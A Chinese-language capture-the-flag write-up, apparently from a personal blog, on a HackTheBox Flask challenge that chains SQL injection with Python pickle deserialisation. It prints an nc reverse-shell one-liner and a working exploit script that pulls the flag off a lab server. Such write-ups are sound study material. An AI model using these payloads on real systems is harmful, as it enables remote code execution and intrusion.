@@ -1,0 +1,458 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>htb-C_O_P | Ak4izZ&#39;s 滴博客儿</title>
+  <meta name="author" content="Ak4izZ">
+  
+  <meta name="description" content="web-challenge-easy，利用sqli和pickle反序列化，踩了一个坑"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="htb-C_O_P"/>
+  <meta property="og:site_name" content="Ak4izZ&#39;s 滴博客儿"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Ak4izZ&#39;s 滴博客儿" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Ak4izZ&#39;s 滴博客儿</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> htb-C_O_P</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>web-challenge-easy，利用sqli和pickle反序列化，踩了一个坑</p>
+<span id="more"></span>
+
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>项目结构</p>
+<img src="/2023/11/20/htb-C-O-P/image-20231120111109367.png" class title="image-20231120111109367">
+
+<p>routes.py里有两个路由</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Blueprint<span class="token punctuation">,</span> render_template
+<span class="token keyword">from</span> application<span class="token punctuation">.</span>models <span class="token keyword">import</span> shop
+
+web <span class="token operator">=</span> Blueprint<span class="token punctuation">(</span><span class="token string">'web'</span><span class="token punctuation">,</span> __name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@web<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> products<span class="token operator">=</span>shop<span class="token punctuation">.</span>all_products<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@web<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/view/&lt;product_id>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">product_details</span><span class="token punctuation">(</span>product_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'item.html'</span><span class="token punctuation">,</span> product<span class="token operator">=</span>shop<span class="token punctuation">.</span>select_by_id<span class="token punctuation">(</span>product_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>/view/&lt;product_id&gt;</code>接收用户输入，传入<code>shop.select_by_id(product_id)</code>，</p>
+<p>跟过去看<code>models.py</code>里的定义，没有经过任何过滤就带入了用户输入</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> application<span class="token punctuation">.</span>database <span class="token keyword">import</span> query_db
+
+<span class="token keyword">class</span> <span class="token class-name">shop</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    <span class="token decorator annotation punctuation">@staticmethod</span>
+    <span class="token keyword">def</span> <span class="token function">select_by_id</span><span class="token punctuation">(</span>product_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> query_db<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SELECT data FROM products WHERE id='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>product_id<span class="token punctuation">&#125;</span></span><span class="token string">'"</span></span><span class="token punctuation">,</span> one<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+    <span class="token decorator annotation punctuation">@staticmethod</span>
+    <span class="token keyword">def</span> <span class="token function">all_products</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> query_db<span class="token punctuation">(</span><span class="token string">'SELECT * FROM products'</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在跟过去<code>database.py</code>看看<code>query_db</code>是怎么写的。<code>database.py</code>定义了数据库初始化的一些方法和物品的类。并没有过滤，因此存在sql注入漏洞</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> g
+<span class="token keyword">from</span> application <span class="token keyword">import</span> app
+<span class="token keyword">from</span> sqlite3 <span class="token keyword">import</span> dbapi2 <span class="token keyword">as</span> sqlite3
+<span class="token keyword">import</span> base64<span class="token punctuation">,</span> pickle
+
+<span class="token keyword">def</span> <span class="token function">connect_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'cop.db'</span><span class="token punctuation">,</span> isolation_level<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
+    
+<span class="token keyword">def</span> <span class="token function">get_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    db <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">'_database'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> db <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        db <span class="token operator">=</span> g<span class="token punctuation">.</span>_database <span class="token operator">=</span> connect_db<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        db<span class="token punctuation">.</span>row_factory <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>Row
+    <span class="token keyword">return</span> db
+
+<span class="token keyword">def</span> <span class="token function">query_db</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> one<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> app<span class="token punctuation">.</span>app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+       <span class="token comment"># 执行 SQL 查询，使用参数 args，并获取查询结果游标</span>
+        cur <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>execute<span class="token punctuation">(</span>query<span class="token punctuation">,</span> args<span class="token punctuation">)</span>
+        <span class="token comment"># 将查询结果转换为字典列表，其中键是列名，值是对应的行数据</span>
+        rv <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>description<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+                   <span class="token keyword">for</span> idx<span class="token punctuation">,</span> value <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token comment"># 如果参数 one 为 True，则返回结果列表的第一个值或空值；否则返回整个结果列表</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token builtin">iter</span><span class="token punctuation">(</span>rv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> rv <span class="token keyword">else</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token keyword">if</span> one <span class="token keyword">else</span> rv
+
+<span class="token keyword">class</span> <span class="token class-name">Item</span><span class="token punctuation">:</span>
+	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> description<span class="token punctuation">,</span> price<span class="token punctuation">,</span> image<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
+		self<span class="token punctuation">.</span>description <span class="token operator">=</span> description
+		self<span class="token punctuation">.</span>image <span class="token operator">=</span> image
+		self<span class="token punctuation">.</span>price <span class="token operator">=</span> price
+
+<span class="token keyword">def</span> <span class="token function">migrate_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    items <span class="token operator">=</span> <span class="token punctuation">[</span>
+        Item<span class="token punctuation">(</span><span class="token string">'Pickle Shirt'</span><span class="token punctuation">,</span> <span class="token string">'Get our new pickle shirt!'</span><span class="token punctuation">,</span> <span class="token string">'23'</span><span class="token punctuation">,</span> <span class="token string">'/static/images/pickle_shirt.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        Item<span class="token punctuation">(</span><span class="token string">'Pickle Shirt 2'</span><span class="token punctuation">,</span> <span class="token string">'Get our (second) new pickle shirt!'</span><span class="token punctuation">,</span> <span class="token string">'27'</span><span class="token punctuation">,</span> <span class="token string">'/static/images/pickle_shirt2.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        Item<span class="token punctuation">(</span><span class="token string">'Dill Pickle Jar'</span><span class="token punctuation">,</span> <span class="token string">'Literally just a pickle'</span><span class="token punctuation">,</span> <span class="token string">'1337'</span><span class="token punctuation">,</span> <span class="token string">'/static/images/pickle.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        Item<span class="token punctuation">(</span><span class="token string">'Branston Pickle'</span><span class="token punctuation">,</span> <span class="token string">'Does this even fit on our store?!?!'</span><span class="token punctuation">,</span> <span class="token string">'7.30'</span><span class="token punctuation">,</span> <span class="token string">'/static/images/branston_pickle.jpg'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">]</span>
+    
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'schema.sql'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        shop <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> items<span class="token punctuation">)</span>
+        get_db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>executescript<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">list</span><span class="token punctuation">(</span>shop<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>同时还注意到，这个web程序用到了pickle，pickle是会涉及到对象的序列化和反序列化的，因此我们再找找有没有反序列化的漏洞。</p>
+<p><a target="_blank" rel="noopener" href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">Exploiting Python pickles</a></p>
+<p>搜索整个项目，有两个地方用到pickle，分别是<code>app.py</code>的<code>pickle_loads</code>和<code>database.py</code>的<code>migrate_db</code></p>
+<img src="/2023/11/20/htb-C-O-P/image-20231120125420499.png" class title="image-20231120125420499">
+
+<p>app.py里存在两个装饰器。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>template_filter</span><span class="token punctuation">(</span><span class="token string">'pickle'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">pickle_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">return</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>teardown_appcontext</span>
+<span class="token keyword">def</span> <span class="token function">close_connection</span><span class="token punctuation">(</span>exception<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    db <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">'_database'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> db <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span> db<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>template_filter</code>用于注册自定义的模板过滤器，允许在模板中对变量进行处理、转换或格式化。这里定义的过滤器名为<code>pickle</code>，在模板文件中，有使用<code>&#123;% set item = product.data | pickle %&#125;</code>等对其进行调用。每当使用<code>&#123;% set item = product.data | pickle %&#125;</code>时，便会触发<code>pickle</code>这个filter，对<code>product.data</code>进行反序列化处理，并将结果返回给<code>item</code>。</p>
+<p>这里的<code>product</code>从哪来呢？回到<code>routes.py</code>可以看出，从sql注入的点我们可以使用union select直接注入恶意字节码，使其在调用pickle filter的时候被反序列化，从而执行恶意代码。需要注意的是还需要加上base64编码和url编码。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@web<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/view/&lt;product_id>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">product_details</span><span class="token punctuation">(</span>product_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'item.html'</span><span class="token punctuation">,</span> product<span class="token operator">=</span>shop<span class="token punctuation">.</span>select_by_id<span class="token punctuation">(</span>product_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><code>pickle.dumps()</code>用于序列化对象，而<code>pickle.loads()</code> 用于反序列化。如下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> pickle
+<span class="token operator">>></span><span class="token operator">></span> d <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'John Wick'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">48</span><span class="token punctuation">&#125;</span>
+<span class="token operator">>></span><span class="token operator">></span> p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>d<span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+<span class="token string">b'\x80\x04\x95 \x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\tJohn Wick\x94\x8c\x03age\x94K0u.'</span>
+<span class="token operator">>></span><span class="token operator">></span> l <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'John Wick'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">48</span><span class="token punctuation">&#125;</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> pickletools
+<span class="token operator">>></span><span class="token operator">></span> pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+    <span class="token number">0</span><span class="token punctuation">:</span> \x80 PROTO      <span class="token number">4</span>
+    <span class="token number">2</span><span class="token punctuation">:</span> \x95 FRAME      <span class="token number">32</span>
+   <span class="token number">11</span><span class="token punctuation">:</span> <span class="token punctuation">&#125;</span>    EMPTY_DICT
+   <span class="token number">12</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">0</span><span class="token punctuation">)</span>
+   <span class="token number">13</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    MARK
+   <span class="token number">14</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'name'</span>
+   <span class="token number">20</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">1</span><span class="token punctuation">)</span>
+   <span class="token number">21</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'John Wick'</span>
+   <span class="token number">32</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">2</span><span class="token punctuation">)</span>
+   <span class="token number">33</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'age'</span>
+   <span class="token number">38</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">3</span><span class="token punctuation">)</span>
+   <span class="token number">39</span><span class="token punctuation">:</span> K        BININT1    <span class="token number">48</span>
+   <span class="token number">41</span><span class="token punctuation">:</span> u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">13</span><span class="token punctuation">)</span>
+   <span class="token number">42</span><span class="token punctuation">:</span> <span class="token punctuation">.</span>    STOP
+highest protocol among opcodes <span class="token operator">=</span> <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对于反序列化来说，如果目标对象实现了<code>__reduce__()</code>方法，那么在loads的时候边会自行触发，在return 里返回元组（长度为2到6，第一个参数为调用函数，后面的元组为参数），例如</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">RCE</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '</span>
+               <span class="token string">'/bin/sh -i 2>&amp;1 | nc 127.0.0.1 1234 > /tmp/f'</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span>
+    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对于本题来说，可以把flag拷到可直接访问的目录下，如&#x2F;static。</p>
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p>试试sqli，<code>/view/2&#39;and(1=1)--+</code> ，回显正常</p>
+<img src="/2023/11/20/htb-C-O-P/image-20231120122553174.png" class title="image-20231120122553174">
+
+<p><code>/view/2&#39;and(1=2)--+</code>，500 error，可以断定sqli成功了</p>
+<img src="/2023/11/20/htb-C-O-P/image-20231120122621816.png" class title="image-20231120122621816">
+
+
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token punctuation">,</span> os<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> requests
+<span class="token keyword">import</span> pickletools
+
+cmd <span class="token operator">=</span> <span class="token string">'cp flag.txt application/static/flag.txt'</span>
+
+<span class="token keyword">class</span> <span class="token class-name">RCE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span>
+
+
+
+payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>RCE<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>
+pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>RCE<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://localhost:1337/view/' UNION SELECT '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://localhost:1337/static/flag.txt"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里踩了一个坑，由于os.system()的底层实现在Linux和Windows下是不同的（Windows使用的是<code>nt.system</code>，Ubuntu使用的是<code>posix.system</code>），htb用的是Linux，因此payload的生成也需要在对应的Linux环境下实现，否则会因为这个问题而无法利用。</p>
+<img src="/2023/11/20/htb-C-O-P/image-20231120145425410.png" class title="image-20231120145425410">
+
+<img src="/2023/11/20/htb-C-O-P/image-20231120145358574.png" class title="image-20231120145358574">
+
+<img src="/2023/11/20/htb-C-O-P/image-20231120145306735.png" class title="image-20231120145306735">
+
+
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/11/20/htb-Neonify/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-11-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/hackthebox/">hackthebox<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/hackthebox/">hackthebox<span>4</span></a></li> <li><a href="/tags/web/">web<span>4</span></a></li> <li><a href="/tags/Flask/">Flask<span>1</span></a></li> <li><a href="/tags/pickle反序列化/">pickle反序列化<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90"><span class="toc-article-text">分析</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#payload"><span class="toc-article-text">payload</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 Ak4izZ's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
